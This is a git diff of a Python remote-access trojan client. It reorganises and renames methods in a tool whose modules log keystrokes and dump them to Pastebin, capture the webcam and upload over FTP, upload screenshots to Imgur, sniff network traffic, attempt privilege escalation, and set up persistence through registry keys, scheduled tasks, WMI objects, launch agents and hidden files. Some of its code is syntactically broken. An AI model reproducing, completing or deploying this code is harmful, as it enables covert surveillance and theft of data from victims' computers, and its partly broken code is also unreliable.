@@ -95,7 +95,7 @@ class Client(object):
         self._logger     = self._get_logger()
         self._modules    = {mod: getattr(self, mod) for mod in __modules__}
         self._commands   = {cmd: getattr(self, cmd) for cmd in __command__}
-        self._result     = self._get_framework()
+        self._result     = self._get_result()
 
     def _wget(self, target): return urlretrieve(target)[0]
     
@@ -103,7 +103,7 @@ class Client(object):
     
     def _unzip(self, fname): return ZipFile(fname).extractall('.')
 
-    def _get_framework(self): return {module:{} for module in self._modules}
+    def _get_result(self): return {module:{} for module in self._modules}
     
     def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')
 
@@ -113,7 +113,7 @@ class Client(object):
 
     def _setup(self, **kwargs): return [setattr(self, '__{}__'.format(chr(i)), kwargs.get('__{}__'.format(chr(i)))) for i in range(97,123) if '__{}__'.format(chr(i)) in kwargs] + [self._usage()]
 
-    def _get_info(self): return {'IP Address': self._ip(),'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Platform','Login','Machine','Admin','Device'}
+    def _get_info(self): return {k:v for k,v in zip(['Platform', 'Machine', 'Version','Release', 'Family', 'Processor', 'IP Address','Login', 'Admin', 'MAC Address'], [i for i in uname()] + [urlopen('http://api.ipify.org').read(), socket.gethostbyname(socket.gethostname()), bool(os.getuid() == 0 if os.name is 'posix' else windll.shell32.IsUserAnAdmin()), '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2))])}
 
     def _get(self, target): return getattr(self, target)() if target in ['jobs','results','options','status','commands','modules','info'] else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
   
@@ -358,7 +358,35 @@ class Client(object):
         except Exception as e:
             return 'Error: {}'.format(str(e))
         return json.dumps(getattr(self, module).options, indent=2, separators=(',', ': '), sort_keys=True)
-        
+    
+    def _command(fx, cmds=__command__):
+        __command__[fx.func_name] = fx
+        return fx
+
+    def _module(fx, cx=__command__, mx=__modules__):
+        if fx.func_name is 'persistence':
+            fx.platforms = ['win32','darwin']
+            fx.options = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
+
+        elif fx.func_name is 'keylogger':
+            fx.platforms = ['win32','darwin','linux2']
+            fx.options = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
+
+        elif fx.func_name is 'webcam':
+            fx.platforms = ['win32']
+            fx.options = {'image': True, 'video': bool()}
+
+        elif fx.func_name is 'packetsniffer':
+            fx.platforms = ['darwin','linux2']
+            fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
+
+        elif fx.func_name is 'screenshot':
+            fx.platforms = ['win32','linux2','darwin']
+            fx.options = {}
+        fx.status = True if sys.platform in fx.platforms else False
+        mx.update({fx.func_name: fx})
+        cx.update({fx.func_name: fx})
+        return fx
 
     def _options(self, *module):
         try:
@@ -374,7 +402,6 @@ class Client(object):
         except Exception as e:
             return 'Option error: {}'.format(str(e))
             
-
     def _show(self, target):
         try:
             results = json.dumps(dict_or_json, indent=2, separators=(',',': '), sort_keys=True)
@@ -551,17 +578,19 @@ class Client(object):
         self.admin.usage            = "usage:         admin\ndescription:   attempt to escalate privileges"
         self.shell.usage            = "usage:         shell\ndescription:   run client shell "
         self.start.usage            = "usage:         start\ndescription:   start client"
-        self.webcam.usage           = "usage:         webcam\ndescription:   capture image/video from webcam + upload via Imgur / remote FTP"
+        self.webcam.usage           = "usage:         webcam\ndescription:   remote image/video capture from client webcam"
         self.enable.usage           = "usage:         enable <module>\ndescription:   enable module"
         self.standby.usage          = "usage:         standby\ndescription:    revert to standby mode"
         self.options.usage          = "usage:         options\ndescription:   display module options"
         self.disable.usage          = "usage:         disable <module>\ndescription:   disable module"
         self.results.usage          = "usage:         results\ndescription:   show all modules output"
         self.commands.usage         = "usage:         commands\ndescription:   list commands with descriptions"
-        self.keylogger.usage        = "usage:         keylogger\ndescription:   log client keystrokes remotely + dump logs on Pastebin"
+        self.keylogger.usage        = "usage:         keylogger\ndescription:   log client keystrokes remotely + dump to Pastebin"
         self.screenshot.usage       = "usage:         screenshot\ndescription:   take screenshot + upload to Imgur"
         self.persistence.usage      = "usage:         persistence\ndescription:   establish persistence to relaunch on reboot"
-        self.packetsniffer.usage    = "usage:         packetsniffer\ndescription:   monitor client network traffic + dump capture on Pastebin"
+        self.packetsniffer.usage    = "usage:         packetsniffer\ndescription:   capture client network traffic + dump to Pastebin"
+
+# ------------------- keylogger -------------------------
 
     def _keylogger_event(self, event):
         if event.WindowName != self.keylogger.options['window']:
@@ -615,6 +644,8 @@ class Client(object):
                     PumpMessages()
                 else:
                     time.sleep(0.1)
+                    
+# ------------------- webcam -------------------------
 
     def _webcam_image(self):
         dev = VideoCapture(0)
@@ -639,6 +670,8 @@ class Client(object):
         dev.release()
         result = self._ftp(fpath)
         return result
+
+# ------------------- packetsniffer -------------------------
 
     def _packetsniffer_udp_header(self, data):
         try:
@@ -778,6 +811,8 @@ class Client(object):
         self._result['packetsniffer'][time.ctime()] = result
         self.packetsniffer.options['buffer'] = []
         return result
+
+# ------------------- persistence -------------------------
 
     def _persistence_add_scheduled_task(self):
         if self.__f__:
@@ -934,36 +969,16 @@ class Client(object):
         except: pass
         return False
 
-    def _command(fx, cmds=__command__):
-        __command__[fx.func_name] = fx
-        return fx
+# ------------------ commands --------------------------
 
-    def _module(fx, cx=__command__, mx=__modules__):
-        if fx.func_name is 'persistence':
-            fx.platforms = ['win32','darwin']
-            fx.options = {'registry key':True, 'scheduled task':True, 'wmi object':True, 'startup file':True, 'hidden file':True} if os.name is 'nt' else {'launch agent':True, 'hidden file':True}
+    @_command
+    def pwd(self): return os.getcwd()
 
-        elif fx.func_name is 'keylogger':
-            fx.platforms = ['win32','darwin','linux2']
-            fx.options = {'max_bytes': 1024, 'next_upload': time.time() + 300.0, 'buffer': bytes(), 'window': None}
+    @_command
+    def run(self): return self._run()
 
-        elif fx.func_name is 'webcam':
-            fx.platforms = ['win32']
-            fx.options = {'image': True, 'video': bool()}
-
-        elif fx.func_name is 'packetsniffer':
-            fx.platforms = ['darwin','linux2']
-            fx.options  = { 'next_upload': time.time() + 300.0, 'buffer': []}
-
-        elif fx.func_name is 'screenshot':
-            fx.platforms = ['win32','linux2','darwin']
-            fx.options = {}
-        fx.status = True if sys.platform in fx.platforms else False
-        mx.update({fx.func_name: fx})
-        cx.update({fx.func_name: fx})
-        return fx
-
-# ------------------ public client functions --------------------------
+    @_command
+    def kill(self): return self._kill()
 
     @_command
     def cd(self, *x): return self._cd(*x)
@@ -974,12 +989,6 @@ class Client(object):
     @_command
     def ls(self, *x): return self._ls(*x)
 
-    @_command
-    def pwd(self): return os.getcwd()
-    
-    @_command
-    def kill(self): return self._kill()
-    
     @_command
     def admin(self): return self._admin()
     
@@ -994,18 +1003,15 @@ class Client(object):
 
     @_command
     def show(self, x): return self._show(x)
-    
-    @_command
-    def run(self): return self._run_modules()
-    
+
     @_command
     def standby(self): return self._standby()
-    
-    @_command
-    def options(self,*arg): return self._options(*arg)
 
     @_command
     def wget(self, target): return self._wget()
+
+    @_command
+    def options(self,*arg): return self._options(*arg)
 
     @_command
     def jobs(self): return self._show(self._threads)
@@ -1019,28 +1025,35 @@ class Client(object):
     @_command
     def results(self): return self._show(self._result)
     
-    @_module
-    def persistence(self): return self._persistence()
-    
-    @_module
-    def screenshot(self): return self._screenshot()
-    
-    @_module
-    def keylogger(self): return self._keylogger()
-    
-    @_module
-    def webcam(self): return self._webcam()
-    
-    @_module
-    def packetsniffer(self): return self._packetsniffer()
+    @_command
+    def info(self): return self._show(self._info, indent=2, separators=(',','\t'))
 
     @_command
     def commands(self): return self._show({cmd for cmd in self._commands: self._commands[cmd].usage})
 
     @_command
     def modules(self): return self._show({mod for mod in self._modules: self._modules[mod].status})
+
+
+# ------------------- modules -------------------------
+
+    @_module
+    def webcam(self): return self._webcam()
     
-# ----------------- MAIN --------------------------
+    @_module
+    def keylogger(self): return self._keylogger()
+
+    @_module
+    def screenshot(self): return self._screenshot()
+
+    @_module
+    def persistence(self): return self._persistence()
+    
+    @_module
+    def packetsniffer(self): return self._packetsniffer()
+
+
+# -----------------   main   --------------------------
 
 def main(*args, **kwargs):
     client = Client(**kwargs)
